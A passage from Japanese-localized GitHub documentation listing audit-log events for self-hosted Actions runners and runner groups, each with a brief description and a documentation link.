| `org.self_hosted_runner_online`           | ランナーアプリケーションが開始されたときにトリガーされます。 REST APIを通じてのみ見ることができます。UIあるいはJSON/CSVエクスポートでは見ることができません。 詳しい情報については「[セルフホストランナーのステータスチェック](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)」を参照してください。                                                                                                                                             |
| `org.self_hosted_runner_offline`          | ランナーアプリケーションが停止されたときにトリガーされます。 REST APIを通じてのみ見ることができます。UIあるいはJSON/CSVエクスポートでは見ることができません。 詳しい情報については、「[セルフホストランナーのステータスチェック](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)」を参照してください。{% endif %}
| `org.self_hosted_runner_updated`          | ランナーアプリケーションが更新されたときにトリガーされます。 REST API及びUIを使って見ることができます。JSON/CSVエクスポートで見ることはできません。 詳しい情報については「[セルフホストランナーについて](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)」を参照してください。                                                                                                                                                                                                   |
| `repo.register_self_hosted_runner`        | 新しいセルフホストランナーが登録されたときにトリガーされます。 詳しい情報については、「[リポジトリにセルフホストランナーを追加する](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository)」を参照してください。                                                                                                                                                                                                                            |
| `repo.remove_self_hosted_runner`          | セルフホストランナーが削除されたときにトリガーされます。 For more information, see "[Removing a runner from a repository](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository)."{% ifversion fpt or ghes > 3.1 or ghae or ghec %}
| `repo.self_hosted_runner_online`          | ランナーアプリケーションが開始されたときにトリガーされます。 REST APIを通じてのみ見ることができます。UIあるいはJSON/CSVエクスポートでは見ることができません。 詳しい情報については「[セルフホストランナーのステータスチェック](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)」を参照してください。                                                                                                                                             |
| `repo.self_hosted_runner_offline`         | ランナーアプリケーションが停止されたときにトリガーされます。 REST APIを通じてのみ見ることができます。UIあるいはJSON/CSVエクスポートでは見ることができません。 詳しい情報については、「[セルフホストランナーのステータスチェック](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)」を参照してください。{% endif %}
| `repo.self_hosted_runner_updated`         | ランナーアプリケーションが更新されたときにトリガーされます。 REST API及びUIを使って見ることができます。JSON/CSVエクスポートで見ることはできません。 詳しい情報については「[セルフホストランナーについて](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)」を参照してください。                                                                                                                                                                                                   |

### セルフホストランナーグループのイベント
| アクション                                    | 説明                                                                                                                                                                                                                                         |
| ---------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `enterprise.runner_group_created`        | セルフホストランナーグループが作成されたときにトリガーされます。 詳しい情報については、「[Enterprise のセルフホストランナーグループを作成する](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise)」を参照してください。     |
| `enterprise.runner_group_removed`        | セルフホストランナーグループが削除されたときにトリガーされます。 詳しい情報については「[セルフホストランナーグループの削除](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)」を参照してください。                                      |
| `enterprise.runner_group_runner_removed` | セルフホストランナーをグループから削除するのにREST APIが使われたときにトリガーされます。                                                                                                                                                                                           |
| `enterprise.runner_group_runners_added`  | セルフホストランナーがグループに追加されたときにトリガーされます。 詳しい情報については、「[セルフホストランナーをグループに移動する](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)」を参照してください。                              |
| `enterprise.runner_group_updated`        | セルフホストランナーグループの設定が変更されたときにトリガーされます。 詳しい情報については「[セルフホストランナーグループのアクセスポリシーの変更](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)」を参照してください。     |
| `org.runner_group_created`               | セルフホストランナーグループが作成されたときにトリガーされます。 詳しい情報については、「[Organization のセルフホストランナーグループを作成する](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization)」を参照してください。 |
| `org.runner_group_removed`               | セルフホストランナーグループが削除されたときにトリガーされます。 詳しい情報については「[セルフホストランナーグループの削除](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)」を参照してください。                                      |
| `org.runner_group_updated`               | セルフホストランナーグループの設定が変更されたときにトリガーされます。 詳しい情報については「[セルフホストランナーグループのアクセスポリシーの変更](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)」を参照してください。     |
| `org.runner_group_runners_added`         | セルフホストランナーがグループに追加されたときにトリガーされます。 詳しい情報については、「[セルフホストランナーをグループに移動する](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)」を参照してください。                              |
| `org.runner_group_runner_removed`        | セルフホストランナーをグループから削除するのにREST APIが使われたときにトリガーされます。 詳しい情報については、「[Organization のグループからセルフホストランナーを削除する](/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization)」を参照してください。                                        |

### ワークフローアクティビティのイベント

{% data reusables.actions.actions-audit-events-workflow %}
